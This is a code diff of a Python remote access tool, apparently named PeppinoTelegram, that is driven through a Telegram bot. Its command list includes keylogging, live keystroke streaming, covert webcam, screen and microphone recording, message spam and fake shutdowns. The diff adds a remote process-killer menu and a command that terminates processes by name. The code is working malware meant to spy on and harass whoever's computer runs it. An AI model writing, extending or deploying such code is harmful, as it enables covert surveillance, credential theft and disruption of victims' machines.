@@ -3,6 +3,7 @@ import requests
 from telepot import Bot, glance
 from telepot.loop import MessageLoop
 from telepot.exception import TelegramError
+from urllib3.exceptions import MaxRetryError
 from telepot.namedtuple import InlineKeyboardButton, InlineKeyboardMarkup
 
 #IMAGES
@@ -17,7 +18,6 @@ from cv2 import (VideoWriter, VideoCapture, imwrite, imshow, imread, resize, wai
 from moviepy.editor import AudioFileClip, VideoFileClip
 
 #AUDIO
-from math import log10
 import soundfile as sf
 import sounddevice as sd
 from comtypes import CLSCTX_ALL
@@ -35,6 +35,7 @@ except ImportError:
 import sys
 import json
 import ctypes
+import psutil
 import socket
 import traceback
 import pyautogui as pg
@@ -143,6 +144,8 @@ keylogger - Records pressed keys on keyboard.
 livekeylogger - Sends live updates about what's being typed on the keyboard.
 setvolume - Set computer's volume level.
 getvolume - Gets the computer's volume level.
+processkiller - Shows a table of processes that you can kill.
+terminateprocess - Kills a process by name.
 mute - Set computer's volume to 0.
 full - Set computer's volume to 100.
 
@@ -302,16 +305,21 @@ def toducky(payload) -> str:
 
 
 class ButtonsMenu:
-    def __init__(self, chat_id: int, bot: Bot, buttons: dict[str, Callable], label: str = "Choose an action", autosend: bool=True, next_btn: bool=False, page_limit: int = 8, page: int=0) -> None:
+    def __init__(self, chat_id: int, bot: Bot, buttons: dict[str, Callable], label: str = "Choose an action", autosend: bool=True, next_btn: bool=False, page_limit: int = 8, page: int=0, next_btn_lab: str = "next_page", prev_btn_lab: str = "previous_page", close_btn_lab="close_page", keyboard_rows=2) -> None:
         self.bot = bot
         self.label = label
         self.chat_id = chat_id
         self.buttons = buttons
         self.page_limit = page_limit
         self.page = page 
+        self.keyboard_rows = keyboard_rows
         self.next_btn = next_btn
-        self.keyboard = self.create_keyboard()
+        self.next_btn_lab = next_btn_lab
+        self.prev_btn_lab = prev_btn_lab
+        self.close_btn_lab = close_btn_lab
         self.sent = False
+
+        self.keyboard = self.create_keyboard()
         if autosend:
             self.send_keyboard()
 
@@ -321,11 +329,12 @@ class ButtonsMenu:
 
         if self.next_btn:
             if self.page > 0:
-                button_list.append(InlineKeyboardButton(text="⬅️ Previous", callback_data="previous_page"))
+                button_list.append(InlineKeyboardButton(text="⬅️ Previous", callback_data=self.prev_btn_lab))
             if (self.page + 1) * self.page_limit < len(self.buttons):
-                button_list.append(InlineKeyboardButton(text="Next ➡️", callback_data="next_page"))
-        
-        keyboard_rows = [button_list[i:i+2] for i in range(0, len(button_list), 2)]
+                button_list.append(InlineKeyboardButton(text="Close ❌", callback_data=self.close_btn_lab)) 
+                button_list.append(InlineKeyboardButton(text="Next ➡️", callback_data=self.next_btn_lab)) 
+
+        keyboard_rows = [button_list[i:i+self.keyboard_rows] for i in range(0, len(button_list), self.keyboard_rows)]
         return InlineKeyboardMarkup(inline_keyboard=keyboard_rows)
 
     def send_keyboard(self) -> int:
@@ -534,6 +543,7 @@ class PeppinoTelegram:
         self.explorer_path = getcwd()
         self.audio_mixer = mixer
         self.cap = capture
+        self.process_explorer_menu = None
         self.explorer_message = None
         #converts text to functions
         self.function_table: dict[str:Callable] = {
@@ -560,6 +570,7 @@ class PeppinoTelegram:
             "messagespam":self.spam_windows,
             "checkforface":self.checkforface,
             "fakeshutdown":self.fake_shutdown,
+            "processkiller":self.process_killer,
             "livekeylogger":self.live_keylogger,
             "microphone":self.send_record_audio,
             "help":lambda: self.bsend(self.help),
@@ -567,6 +578,7 @@ class PeppinoTelegram:
             "distortedscreen":self.distorted_screen,
             "fullclip":self.record_webcam_and_screen,
             "duckyhelp":lambda: self.bsend(self.duckyhelp),
+            "terminateprocess":self.terminate_process_by_name,
             "id":lambda:self.bsend(f"CHAT_ID: {self.owner_id}"),
             "recordjum":self.record_jumpscare_reaction,
             "mutevolume":lambda:self.audio_mixer.mute(),
@@ -602,8 +614,8 @@ class PeppinoTelegram:
     def new_loading_bar(self, total: int, autodelete: bool=False, showperc:bool=True, label=None) -> LoadingBar:
         return LoadingBar(total, self.owner_id, self.bot, autodelete=autodelete, showperc=showperc, label=label)
     
-    def new_menu(self, menu: dict[str:Any], autosend: bool=True, label="Choose an option: ", page=0, next_btn: bool=False) -> ButtonsMenu:
-        return ButtonsMenu(self.owner_id, self.bot, menu, label, autosend, page=page, next_btn=next_btn)
+    def new_menu(self, menu: dict[str:Any], autosend: bool=True, label: str="Choose an option: ", page: int=0, next_btn: bool=False, next_btn_lab: str="next_page", prev_btn_lab: str="previus_page", close_btn_lab: str="close_page", rows=2) -> ButtonsMenu:
+        return ButtonsMenu(self.owner_id, self.bot, menu, label, autosend, page=page, next_btn=next_btn, next_btn_lab=next_btn_lab, prev_btn_lab=prev_btn_lab, close_btn_lab=close_btn_lab, keyboard_rows=rows)
 
     def opencap(self) -> None:
         if not self.cap.isOpened():
@@ -648,10 +660,28 @@ class PeppinoTelegram:
         menu = self.new_menu(buttons, autosend=False)
         return menu.send_keyboard()
     
-    def on_callback_query(self, msg):
+    def on_callback_query(self, msg) -> None:
         query_id, from_id, data = glance(msg, flavor="callback_query")
         self.parse_command(data) 
         self.bot.answerCallbackQuery(query_id)
+
+    def process_killer(self, page=0) -> None:
+        if self.process_explorer_menu is None:
+            self.page = 0
+        else:
+            self.process_explorer_menu.delete()
+            self.page = page
+        processes = [x.name() for x in psutil.process_iter()] 
+        self.process_explorer_menu = self.new_menu({process:f"/terminateprocess {process}" for process in processes}, next_btn=True, autosend=False, page=self.page, next_btn_lab="PK_next_page", prev_btn_lab="PK_previous_page", close_btn_lab="PK_close_page", rows=3)
+        return self.process_explorer_menu.send_keyboard()
+
+    def check_if_proc_running(self, processname) -> bool:
+        return processname.lower().strip() in [x.name().lower().strip() for  x in psutil.process_iter()]
+
+    def terminate_process_by_name(self, process_name: str) -> None:
+        for proc in psutil.process_iter():
+            if proc.name().lower() == process_name.lower().strip():
+                proc.terminate()
         
     def screenshot(self) -> int:
         try:
@@ -1007,9 +1037,12 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   o
             recording_thread = Thread(target=self.record_webcam_and_screen, args=(20,))
 
         recording_thread.start()
+        status_message = self.new_editable_message("Recording")
         sleep(7)
         self.jumpscare(playaudio=True)
+        status_message.edit("Jumpscared!")
         recording_thread.join()
+        status_message.delete()
 
     
     def plankton(self) -> None:
@@ -1088,6 +1121,17 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
                 self.bsend(f"Invalid args for function {command}\n{e}")
             except Exception as e:
                 self.bsend(f"Unhandler error for function {command}\n{e}")
+        elif not func:
+            if command == "PK_next_page" and self.process_explorer_menu:
+                self.page += 1
+                self.process_killer(page=self.page)
+            elif command == "PK_previous_page" and self.process_explorer_menu:
+                self.page -= 1
+                self.process_killer(page=self.page)
+            elif command == "PK_close_page" and self.process_explorer_menu:
+                self.process_explorer_menu.delete()
+            elif command in ("PK_next_page", "PK_previous_page") and not self.process_explorer_menu:
+                self.bsend("Use /processkiller first")
         else:
             self.bsend(f"Invalid command {command}")
     
@@ -1135,7 +1179,10 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
         return response.status_code == 200
 
     def start(self) -> None:
-        self.bot.deleteWebhook()
+        try:
+            self.bot.deleteWebhook()
+        except MaxRetryError:
+            sys.exit() 
         self.update_commands()
         self.images = load_images()
         self.audios = load_audios()
